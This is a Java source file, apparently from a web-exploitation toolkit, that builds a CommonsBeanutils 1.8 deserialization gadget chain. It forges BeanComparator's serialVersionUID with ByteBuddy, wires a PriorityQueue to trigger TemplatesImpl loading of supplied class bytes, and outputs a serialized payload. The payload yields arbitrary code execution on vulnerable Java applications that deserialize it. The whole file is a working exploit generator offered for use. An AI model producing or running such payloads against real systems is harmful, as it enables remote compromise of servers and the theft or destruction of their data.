package com.reajason.javaweb.packer.deserialize.java;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.deserialize.JavaDeserializeGenerator;
import com.reajason.javaweb.packer.deserialize.TemplateUtils;
import com.reajason.javaweb.packer.deserialize.utils.Reflections;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.description.modifier.FieldManifestation;
import net.bytebuddy.description.modifier.Ownership;
import net.bytebuddy.description.modifier.Visibility;
import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
import org.apache.commons.beanutils.BeanComparator;

import java.net.URL;
import java.net.URLClassLoader;
import java.util.Comparator;
import java.util.PriorityQueue;


/**
 * @author ReaJason
 * @since 2025/2/17
 */
public class CommonsBeanutils18Packer implements Packer {

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        Object comparator = new ByteBuddy()
                .redefine(BeanComparator.class)
                .defineField("serialVersionUID", long.class, Visibility.PRIVATE, Ownership.STATIC, FieldManifestation.FINAL)
                .value(-3490850999041592962L).make()
                .load(new URLClassLoader(new URL[]{}), ClassLoadingStrategy.Default.INJECTION).getLoaded()
                .getDeclaredConstructor(String.class, Comparator.class)
                .newInstance(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<>(2, ((Comparator) comparator));
        queue.add("1");
        queue.add("1");
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        Object obj = TemplateUtils.createTemplatesImpl(config.getClassBytes());
        Reflections.setFieldValue(queue, "queue", new Object[]{obj, obj});
        return JavaDeserializeGenerator.generate(queue);
    }
}
